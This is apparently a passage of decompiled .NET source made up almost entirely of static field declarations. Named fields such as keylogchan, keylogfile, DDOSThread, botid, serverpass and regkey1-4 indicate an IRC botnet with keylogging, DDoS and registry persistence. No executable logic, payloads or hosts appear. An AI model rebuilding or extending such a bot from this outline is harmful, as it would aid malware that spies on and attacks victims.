  internal static \u0024ArrayType\u0024\u0024\u0024BY0BL\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D139;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D140;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D141;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BN\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D142;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D143;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D144;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DG\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D145;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CG\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D146;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D147;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D148;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D149;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D150;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D151;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D152;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CK\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D153;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DD\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D154;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040 threads;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00D serverpass;
  internal static int nickprefix;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00D chanpass;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BF\u0040D server;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04D modeonconn;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09D keylogchan;
  internal static int success;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BD\u0040D version;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06_W botid;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03D nickconst;
  internal static IRC mainirc;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040_W valuename;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040UALIAS\u0040\u0040 aliases;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04PAD versionlist;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040_W keylogfile;
  internal static int topiccmd;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040_W regkey3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09D channel;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CF\u0040_W regkey4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040_W filename;
  internal static uint started;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00PAD authost;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03D password;
  internal static int port;
  internal static sbyte prefix;
  internal static int anum;
  internal static int nicktype;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DG\u0040_W regkey2;
  internal static int current_version;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CO\u0040_W regkey1;
  internal static int maxrand;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CE\u0040\u0024\u0024CBD \u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D4;
  public static unsafe int** __unep\u0040\u003FDDOSThread\u0040\u0040\u0024\u0024FYGKPAX\u0040Z;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D8;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D9;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D10;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D11;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D12;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D13;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DJ\u0040\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D14;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DI\u0040\u0024\u0024CBD \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D15;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CB_W \u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D16;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DC\u0040D \u003FA0x53f242d0\u002E\u003Fstr\u0040\u003F1\u003F\u003FcommaI64\u0040\u0040YAPBD_K\u0040Z\u00404PADA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CB_W \u003FA0x73818fef\u002Eunnamed\u002Dglobal\u002D0;
  internal static uint scratch;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D8;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D9;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D10;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D11;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D12;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D13;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D14;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D15;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D16;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D17;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D18;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D19;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D20;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D21;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D22;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D23;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D24;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D25;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D26;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D27;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D28;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D29;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D30;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D31;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D32;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D33;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D34;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D35;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D36;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D37;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D38;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D39;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D40;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BD\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D41;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D42;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D43;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D44;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D45;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D46;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D47;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BD\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D48;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D49;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D50;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D51;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D52;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D53;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D54;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D55;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D56;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D57;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D58;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D59;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D60;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D61;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D62;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D63;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D64;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D65;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D66;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D67;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D68;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D69;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D70;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D71;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D72;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D73;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D74;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D75;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D76;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D77;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D78;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D79;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D80;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D81;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D82;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D83;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D84;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D85;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D86;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D87;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D88;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D89;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D90;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D91;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D92;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D93;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D94;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D95;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D96;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D97;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D98;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D99;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D100;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D101;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D102;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D103;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D104;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D105;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D106;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D107;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D108;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D109;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D110;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D111;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D112;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D113;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BF\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D114;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D115;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D116;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BN\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D117;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D118;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D119;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D120;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D121;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D122;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D123;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D124;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D125;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D126;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D127;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D128;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D129;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D130;
